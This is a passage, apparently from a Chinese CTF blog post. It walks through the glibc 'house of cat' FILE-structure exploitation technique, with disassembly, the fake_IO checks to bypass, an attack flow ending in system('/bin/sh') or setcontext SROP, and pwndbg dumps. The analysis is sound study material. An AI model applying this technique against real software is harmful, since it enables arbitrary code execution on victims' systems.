&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&amp;gt;FUNC) (THIS, X1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到对_IO_WOVERFLOW 没有进行任何检测，为了便于理解，我们再来看看汇编代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0x7f4cae745d30 &amp;lt;_IO_switch_to_wget_mode&amp;gt;       endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d34 &amp;lt;_IO_switch_to_wget_mode+4&amp;gt;     mov    rax, qword ptr [rdi + 0xa0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d3b &amp;lt;_IO_switch_to_wget_mode+11&amp;gt;    push   rbx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d3c &amp;lt;_IO_switch_to_wget_mode+12&amp;gt;    mov    rbx, rdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d3f &amp;lt;_IO_switch_to_wget_mode+15&amp;gt;    mov    rdx, qword ptr [rax + 0x20]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d43 &amp;lt;_IO_switch_to_wget_mode+19&amp;gt;    cmp    rdx, qword ptr [rax + 0x18]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d47 &amp;lt;_IO_switch_to_wget_mode+23&amp;gt;    jbe    _IO_switch_to_wget_mode+56                &amp;lt;_IO_switch_to_wget_mode+56&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d49 &amp;lt;_IO_switch_to_wget_mode+25&amp;gt;    mov    rax, qword ptr [rax + 0xe0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d50 &amp;lt;_IO_switch_to_wget_mode+32&amp;gt;    mov    esi, 0xffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d55 &amp;lt;_IO_switch_to_wget_mode+37&amp;gt;    call   qword ptr [rax + 0x18]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在造成任意地址写一个堆地址的基础上，这里的寄存器 rdi（fake_IO 的地址）、rax 和 rdx 都是我们可以控制的，&lt;/p&gt;
&lt;p&gt;rdi 是我们伪造的 io_file 的地址，我们将 rax 控制为堆上的一个地址，就可以实现任意函数的调用。&lt;/p&gt;
&lt;p&gt;这里还要补习一下 setcontext 的知识&lt;/p&gt;
&lt;p&gt;在开启沙箱的情况下，假如把最后调用的 [rax + 0x18] 设置为 setcontext，把 rdx 设置为可控的堆地址，就能执行 srop 来读取 flag；如果未开启沙箱，则只需把最后调用的 [rax + 0x18] 设置为 system 函数，把 fake_IO 的头部写入 /bin/sh 字符串，就可执行 system (&amp;quot;/bin/sh&amp;quot;)&lt;/p&gt;
&lt;p&gt;fake_IO 结构体需要绕过的检测&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_wide_data-&amp;gt;_IO_read_ptr ！=_wide_data-&amp;gt;_IO_read_end&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; _wide_data-&amp;gt;_IO_write_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#如果_wide_data=fake_io_addr+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;，其实也就是fp-&amp;gt;_IO_save_base &amp;lt; f-&amp;gt;_IO_backup_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp``-``&amp;gt;_lock是一个可写地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp``-``&amp;gt;_mode ``=` `&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;大致的攻击流程&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;修改_IO_list_all 为可控地址（FSOP）或修改 stderr 为可控地址 (__malloc_assert)。&lt;/li&gt;
&lt;li&gt;在上一步的可控地址中伪造 fake_IO 结构体。&lt;/li&gt;
&lt;li&gt;通过 FSOP 或 malloc 触发攻击。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是当我进行到这里的时候，我发现不能独立正常的复现，因为作者的文章并没有给出这条完整利用链。&lt;/p&gt;
&lt;h3 id=&#34;问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#问题&#34;&gt;#&lt;/a&gt; 问题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;完整的利用链是从哪里触发， 完整的函数调用链是怎么样的？&lt;/li&gt;
&lt;li&gt;作者提出了两个不同的流程，一个是进行 FSOP，利用的是_IO_flush_all_lockp 函数来刷新所有的 IO 流。也就是说最后是进入 flush 函数，进行一系列的调用，对应的就是虚表中的_IO_overflow. 但是_IO_flush_all_lockp 触发的前提应该是能执行 exit (显式调用、libc 调用 abort、以及 main 函数正常退出)&lt;/li&gt;
&lt;li&gt;另外一个思路是利用利用__malloc_assert 触发的报错。会使用 stderr 进行一个报错输出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上，house of cat 的关键点是 JUMP_INIT (seekoff, _IO_wfile_seekoff), 顺利的进入后又会执行 _IO_switch_to_wget_mode (fp)，最大的问题就是如何进入这里 _IO_wfile_seekoff?&lt;/p&gt;
&lt;p&gt;以下为个人的分析过程&lt;/p&gt;
&lt;p&gt;我们要知道这里代替了谁。函数的入口在于 IO 函数初始化后调用谁的问题，因为我们是对 vtable 进行了偏移替换，所以我们将二者进行一个对比。&lt;/p&gt;
&lt;p&gt;修改前的 IO_list_all 的对应&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f56882ae680&lt;/span&gt; &amp;lt;_IO_list_all&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f56882ae680&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x7f56882ae6a0&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x7f56882ae6a0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72540025&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x7f56882ae723&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x7f56882ae724&lt;/span&gt; &amp;lt;_IO_2_1_stderr_+&lt;span class=&#34;number&#34;&gt;132&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x7f56882ae780&lt;/span&gt; &amp;lt;_IO_2_1_stdout_&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x7f56882afa60&lt;/span&gt; &amp;lt;_IO_stdfile_2_lock&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x7f56882ad8a0&lt;/span&gt; &amp;lt;_IO_wide_data_2&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f56882aa600&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _IO_file_jumps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __finish = &lt;span class=&#34;number&#34;&gt;0x7f5688120070&lt;/span&gt; &amp;lt;_IO_new_file_finish&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __overflow = &lt;span class=&#34;number&#34;&gt;0x7f5688120e40&lt;/span&gt; &amp;lt;_IO_new_file_overflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __underflow = &lt;span class=&#34;number&#34;&gt;0x7f5688120b30&lt;/span&gt; &amp;lt;_IO_new_file_underflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __uflow = &lt;span class=&#34;number&#34;&gt;0x7f5688121de0&lt;/span&gt; &amp;lt;__GI__IO_default_uflow&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __pbackfail = &lt;span class=&#34;number&#34;&gt;0x7f5688123300&lt;/span&gt; &amp;lt;__GI__IO_default_pbackfail&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsputn = &lt;span class=&#34;number&#34;&gt;0x7f568811f680&lt;/span&gt; &amp;lt;_IO_new_file_xsputn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsgetn = &lt;span class=&#34;number&#34;&gt;0x7f568811f330&lt;/span&gt; &amp;lt;__GI__IO_file_xsgetn&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekoff = &lt;span class=&#34;number&#34;&gt;0x7f568811e960&lt;/span&gt; &amp;lt;_IO_new_file_seekoff&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekpos = &lt;span class=&#34;number&#34;&gt;0x7f5688122530&lt;/span&gt; &amp;lt;_IO_default_seekpos&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __setbuf = &lt;span class=&#34;number&#34;&gt;0x7f568811e620&lt;/span&gt; &amp;lt;_IO_new_file_setbuf&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __sync = &lt;span class=&#34;number&#34;&gt;0x7f568811e4b0&lt;/span&gt; &amp;lt;_IO_new_file_sync&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __doallocate = &lt;span class=&#34;number&#34;&gt;0x7f5688112b90&lt;/span&gt; &amp;lt;__GI__IO_file_doallocate&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __read = &lt;span class=&#34;number&#34;&gt;0x7f568811f9b0&lt;/span&gt; &amp;lt;__GI__IO_file_read&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __write = &lt;span class=&#34;number&#34;&gt;0x7f568811ef40&lt;/span&gt; &amp;lt;_IO_new_file_write&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seek = &lt;span class=&#34;number&#34;&gt;0x7f568811e6f0&lt;/span&gt; &amp;lt;__GI__IO_file_seek&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __close = &lt;span class=&#34;number&#34;&gt;0x7f568811e610&lt;/span&gt; &amp;lt;__GI__IO_file_close&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stat = &lt;span class=&#34;number&#34;&gt;0x7f568811ef30&lt;/span&gt; &amp;lt;__GI__IO_file_stat&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __showmanyc = &lt;span class=&#34;number&#34;&gt;0x7f56881234a0&lt;/span&gt; &amp;lt;_IO_default_showmanyc&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __imbue = &lt;span class=&#34;number&#34;&gt;0x7f56881234b0&lt;/span&gt; &amp;lt;_IO_default_imbue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改后 (地址不一样，看偏移)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span 